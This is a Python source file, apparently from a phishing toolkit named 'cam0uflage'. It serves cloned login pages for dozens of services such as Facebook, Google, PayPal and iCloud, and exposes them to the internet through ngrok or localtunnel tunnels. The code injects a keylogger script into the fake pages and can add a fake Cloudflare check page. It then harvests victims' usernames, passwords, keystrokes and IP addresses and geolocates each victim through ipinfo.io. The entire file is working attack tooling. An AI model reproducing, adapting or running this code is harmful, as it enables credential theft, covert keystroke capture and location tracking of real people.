from os import system, path
from distutils.dir_util import copy_tree
from time import sleep
import re
import json
from urllib.request import urlopen
from subprocess import check_output, CalledProcessError
from sys import stdout, argv, exit
from Defs.ThemesManager import colorSelector
from Defs.Configurations import readConfig, ifSettingsNotExists
from Defs.Languages import *
vd=['Facebook','Google','LinkedIn','GitHub','StackOverflow','WordPress','Twitter','Instagram','Snapchat','Yahoo','Twitch','Microsoft','Steam','iCloud','GitLab','NetFlix','Origin','Pinterest','ProtonMail','Spotify','Quora','PornHub','Adobe','Badoo','CryptoCurrency','DevianArt','DropBox','eBay','Myspace','PayPal','Shopify','Verizon','Yandex','Reddit','Subitoit','PlayStation']
installGetText()
languageSelector()
ifSettingsNotExists()
config = readConfig()

logFile = None
didBackground = config.get("Settings","DidBackground")
for arg in argv:
    if arg=="--nolog":
        didBackground = False
if config.get("Settings", "DidBackground") == "True":
    logFile = open("log.txt", "w")

colorTheme = colorSelector()
MAIN0, MAIN1, MAIN2, MAIN3, MAIN4 = colorTheme[0], colorTheme[1], colorTheme[2], colorTheme[3],  colorTheme[4]

def runPhishing(page , customOption):
    system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ ')
    if page in ['Google','Facebook','VK','Reddit','Instagram']:
        try:copy_tree("WebPages/{0}{1}/".format(page.lower(),customOption), "Server/www/")
        except:endMessage()
    else:
        try:copy_tree("WebPages/{0}/".format(page.lower()), "Server/www/")
        except:endMessage()

def selectPort():
    choice = input("{0}cam0uflage(port)> {1}".format(MAIN0, MAIN2))
    try:return selectPort()if(int(choice)>65535 or int(choice)<1)else choice
    except:return selectPort()

def selectServer(port):
        choice = input("{0}1{1} ngrok\n{0}2{1} localtunnel\n{0}cam0uflage(relay)> {1}".format(MAIN0,MAIN2))
        if choice == '1':
            print('[ngrok_service]'.format(MAIN0, MAIN2))
            system('./Server/ngrok http {} > /dev/null &'.format(port))
            while True:
                sleep(2)
                system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
                with open('ngrok.url', 'r') as uri:url=uri.read()[:-1]
                if re.match("https://[0-9a-z]*\.ngrok.io", url):
                    print("{0}[{1}http://127.0.0.1:{2}{0}] -> {0}[{1}{3}{0}]".format(MAIN2, MAIN3, port,url))  
                    break
        elif choice == '2':runLT(port)
        else:return selectServer(port)
def runLT(port):
    s=input('{0}[{1}leave blank for random{0}]\n{0}cam0uflage(localtunnel/subdomain)> {2}'.format(MAIN0,MAIN2,MAIN4))
    try:
        system('lt -p '+port+((' -s '+s)if s!=''else s)+' > link.url &')
        sleep(3)
        print("{2}[https://127.0.0.1:{3}]{0}{1} -> {2}[{4}]{0}".format(MAIN0, MAIN2, MAIN3, port, str(check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",shell=True)).strip("b ' \ n r")))
    except CalledProcessError:
        print('{0}error[invalid/preoccupied]{0}'.format(MAIN0))
        runLT(port)

def runMainMenu(): #Main Menu
    print ("{1}install PHP and rerun. http://www.php.net/".format(MAIN2, MAIN4, MAIN0) if 256 == system('which php > /dev/null') else '')
def mainMenu():
    system('clear')
    for i in vd:print("{0}{2}{1} {3}".format(MAIN0, MAIN2,str(vd.index(i)+1).zfill(2),i)+' '*(15-len(i))+('\n' if (vd.index(i)+1)%3==0 else ''),end='')
    o = int(input(MAIN0+"cam0uflage(vendor)> "+MAIN2))
    if o==1:runPhishing(vd[0],input("{0}1{1} default\n{0}2{1} poll\n{0}3{1} security issue\n{0}4{1} messenger{0}cam0uflage(mode)> {2}".format(MAIN0, MAIN2, MAIN2)))
    elif o==2:runPhishing(vd[1],input("{0}1{1} default\n{0}2{1} poll\n{0}3{1} new page\n{0}cam0uflage(mode)> {2}".format(MAIN0, MAIN2, MAIN2)))
    elif o==8:runPhishing(vd[7],input("{0}1{1} default\n{0}2{1} autoliker\n{0}3{1} profile\n{0}4{1} blue badge\n{0}5{1} followers\n{0}cam0uflage(mode)> {2}".format(MAIN0, MAIN2, MAIN2)))
    elif o==14:runPhishing(vd[13],input("{0}1{1} default\n{0}2{1} poll\n{0}cam0uflage(mode)> {2}".format(MAIN0, MAIN4, MAIN2)))   
    elif o==35:runPhishing(vd[34],input("{0}1{1} new page\n{0}2{1} old page\n{0}cam0uflage(mode)> {2}".format(MAIN0, MAIN2, MAIN2)))
    elif o<38:runPhishing(vd[o-1],'')
    else:endMessage()
def inputCustom():
    custom = input('{0}cam0uflage(redirect)> {1}'.format(MAIN0, MAIN2))
    custom = ('http://' if 'http://' not in custom or 'https://' not in custom else '')+custom
    if path.exists('Server/www/post.php') and path.exists('Server/www/login.php'):
        with open('Server/www/post.php','r+') as f:
            c = f.read().replace('<CUSTOM>', custom)
            f.seek(0)
            f.write(c)
    with open('Server/www/login.php','r+') as f:
        c = f.read().replace('<CUSTOM>', custom)
        f.seek(0)
        f.write(c)
def addingCloudfare():
        if input("{1}{0}cam0uflage(cloudflare_page)> {2}".format(MAIN0, MAIN4,MAIN2)) in 'yY1':system('mv Server/www/index.* Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
def keylog():
        if input('{1}{0}cam0uflage(keylogger)> {2}'.format(MAIN0, MAIN4,MAIN2)) in 'Yy1':
           with open('Server/www/index.'+('html' if path.exists('Server/www/index.html') else 'php'),'w+') as f:
                c = f.read().replace('</title>', '</title><script src="keylogger.js"></script>')
                f.seek(0)
                f.write(c)
def runServer(port):
    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
    system("cd Server/www/; php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))
def endMessage():
        c=input("\n{0}[r:rerun{1}|{0}return:exit]\n{0}{2}".format(MAIN0, MAIN4, MAIN2))
        if c=='r':system('sudo python3 '+argv[0])
        elif c=='':exit(0)
        else:endMessage()
def getCredentials(port):
    print("{0}[keep listenin']{1}".format(MAIN2,MAIN4))
    while True:
        with open('Server/www/usernames.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                writeLog('{0}[dump]{1}\n{0}{2}{1}'.format(MAIN2, MAIN3, lines))
                system('cp Server/www/usernames.txt Server/CapturedData/usernames.txt && rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
        with open('Server/www/ip.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                ip = re.match('Victim Public IP: (.*.*.*)\n', lines).group(1)
                user = re.match('Current logged in user: (a-z0-9)\n', lines)
                resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                if 'bogon' in ipinfo:
                    log('{0}[ip_extras]{1}\n {0}{2}{1}'.format(MAIN0, MAIN2, lines))
                else:
                    matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                    latitude = matchObj.group(1)
                    longitude = matchObj.group(2)
                    writeLog('\n{0}[lat,long]: [{2},{3}]{1}'.format(MAIN3, MAIN2, latitude,longitude))
                    writeLog('\n{0}isp: {2} \nCountry: {3}{1}'.format(MAIN3, MAIN2, ipinfo['org'], ipinfo['country']))
                    writeLog('\n{0}Region: {2} \nCity: {3}{1}'.format(MAIN3, MAIN2, ipinfo['region'], ipinfo['city']))
                system('cp Server/www/ip.txt Server/CapturedData/ip.txt && rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
        with open('Server/www/KeyloggerData.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                writeLog('{1}[{0}logging_keys{1}]{1}:\n {0}%s{1}'.format(MAIN3, MAIN2) % lines)
                system('cp Server/www/KeyloggerData.txt Server/CapturedData/KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
def writeLog(ctx):
    if config.get("Settings", "DidBackground") == "True":
        logFile.write(ctx.replace(MAIN0, "").replace(MAIN1, "").replace(MAIN2, "").replace(MAIN3, "").replace(MAIN4, "") + "\n")
    print(ctx)
